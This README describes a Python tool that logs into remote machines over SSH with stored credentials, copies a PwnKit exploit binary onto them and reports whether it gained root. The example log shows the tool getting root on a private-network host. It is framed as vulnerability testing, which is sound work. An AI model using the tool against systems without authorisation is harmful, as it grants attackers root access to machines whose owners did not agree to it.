# PwnKit Over SSH

A script that uses SSH to test if a remote system is vulnerable to PwnKit

## Dependencies
```
sudo apt-get install python3-pip
pip3 install paramiko
```

## How to use it
1. Add your IPs and usernames/passwords to `config.yaml`
2. Open a terminal and run `python3 pwnkit_over_ssh.py`

## Example output:
```
$ python3 pwnkit_over_ssh.py
2023-04-01 00:45:08,246 UTC - DEBUG - Reading config file...
2023-04-01 00:45:08,249 UTC - DEBUG - Successfully read config file
2023-04-01 00:45:08,249 UTC - INFO - Connecting to guest@192.168.199.129...
2023-04-01 00:45:08,308 UTC - INFO - Successfully connected to guest@192.168.199.129
2023-04-01 00:45:08,308 UTC - INFO - Copying pwnkit_x64 binary over SSH...
2023-04-01 00:45:08,640 UTC - INFO - Successfully copied pwnkit_x64 binary over SSH
2023-04-01 00:45:08,651 UTC - INFO - Checking for root privileges...
2023-04-01 00:45:08,693 UTC - DEBUG - 'whoami' output: root
2023-04-01 00:45:08,693 UTC - INFO - Successfully got root on guest@192.168.199.129
```
